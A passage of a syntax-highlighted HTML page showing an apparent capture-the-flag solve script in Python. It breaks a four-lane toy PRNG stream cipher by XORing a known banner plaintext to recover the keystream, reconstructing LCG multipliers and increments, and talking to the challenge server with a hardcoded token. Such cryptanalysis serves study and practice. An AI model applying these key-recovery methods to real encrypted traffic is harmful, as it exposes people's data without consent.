</span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> x</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> p</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    g</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> egcd</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> m</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> g </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        raise</span><span style="color:#B8A965"> ValueError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">no inverse</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">%</span><span style="color:#DBD7CAEE"> m</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> recover_ab_for_lane</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">states</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">states</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><span style="color:#DBD7CAEE">    pairs </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">states</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        x0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> states</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> states</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> states</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">        dx </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x1 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> x0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><span style="color:#DBD7CAEE">        dy </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x2 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> x1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><span style="color:#DBD7CAEE">        pairs</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">dx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dy</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    best_idx </span><span style="color:#666666">=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><br><span style="color:#DBD7CAEE">    min_tz </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 65</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">dx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> in</span><span style="color:#B8A965"> enumerate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pairs</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> dx </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            continue</span><br><span style="color:#DBD7CAEE">        tz </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> count_trailing_zeros</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">dx</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> tz </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> min_tz</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            min_tz </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tz</span><br><span style="color:#DBD7CAEE">            best_idx </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> i</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> best_idx </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">    dx_best</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dy_best </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pairs</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">best_idx</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    k </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> min_tz</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">dy_best </span><span style="color:#CB7676">&#x26;</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> k</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">    mod_reduced </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">64</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> k</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    dx_odd </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> dx_best </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> k</span><br><span style="color:#DBD7CAEE">    dy_reduced </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> dy_best </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> k</span><br><span style="color:#DBD7CAEE">    a_base </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">dy_reduced </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> modinv</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">dx_odd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> mod_reduced</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">mod_reduced </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    step </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> mod_reduced</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> k</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        a_cand </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> a_base </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> step</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> all</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">a_cand </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> dx</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> dy </span><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> dx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> dy </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> pairs</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            x0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> states</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> states</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">            b </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x1 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> a_cand </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> x0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><span style="color:#4D9375">            return</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> a_cand</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> b</span><span style="color:#5eaab5">}</span><br><span style="color:#4D9375">    return</span><span style="color:#4D9375"> None</span><br><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Keystream PRNG</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#CB7676">class</span><span style="color:#5DA994"> ToyPRNG</span><span style="color:#666666">:</span><br><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> params</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">lanes </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> params  </span><span style="color:#758575DD"># list of dicts with A,B,X</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">idx </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> get_keystream_block</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        lane </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">lanes</span><span style="color:#5eaab5">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">        x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lane</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">X</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">        v6 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> x</span><br><span style="color:#DBD7CAEE">        t </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> v6 </span><span style="color:#CB7676">^</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v6 </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        t </span><span style="color:#666666">^=</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 2</span><br><span style="color:#DBD7CAEE">        t </span><span style="color:#666666">^=</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 4</span><br><span style="color:#DBD7CAEE">        t </span><span style="color:#666666">^=</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 8</span><br><span style="color:#DBD7CAEE">        v7 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> t </span><span style="color:#CB7676">^</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        val </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> v7 </span><span style="color:#CB7676">^</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v7 </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        k_block </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">val </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 7</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">val </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 57</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><br><span style="color:#DBD7CAEE">        lane</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">X</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">lane</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> lane</span><span style="color:#4d9375">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">idx </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">idx </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 4</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> k_block</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">little</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> encrypt</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">:</span><span style="color:#B8A965"> bytes</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> isinstance</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        out </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytearray</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        ks </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#4D9375">        while</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ks</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            ks </span><span style="color:#666666">+=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get_keystream_block</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> zip</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ks</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            out</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> b</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#B8A965"> bytes</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">out</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    decrypt </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> encrypt</span><br><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Recovery from banner</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> recover_cipher</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tube</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">token:</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">icqcb7c320de268ecb6e421212869a01</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">aaa</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    enc_hex </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">430</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    while</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">enc_hex</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 430</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        enc_hex </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">430</span><span style="color:#CB7676"> -</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">enc_hex</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">    # Drop unencrypted newline after the hex banner to keep offsets aligned</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        leftover </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">0.2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> leftover </span><span style="color:#CB7676">not</span><span style="color:#CB7676"> in</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#4D9375"> None</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#CB7676">==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">debug</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Flushed newline: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">leftover</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> EOFError</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        pass</span><br><br><span style="color:#DBD7CAEE">    enc_bytes </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fromhex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">enc_hex</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    keystream </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytearray</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">enc_bytes</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> ^</span><span style="color:#C99076"> BANNER_PT</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#C99076">BANNER_PT</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    lanes </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    limit </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">keystream</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> limit</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        block </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">from_bytes</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">keystream</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">little</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        state </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recover_state_from_block</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">block</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        lanes</span><span style="color:#5eaab5">[</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">//</span><span style="color:#4C9A91"> 8</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 4</span><span style="color:#5eaab5">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">state</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    params </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> recover_ab_for_lane</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">lanes</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span 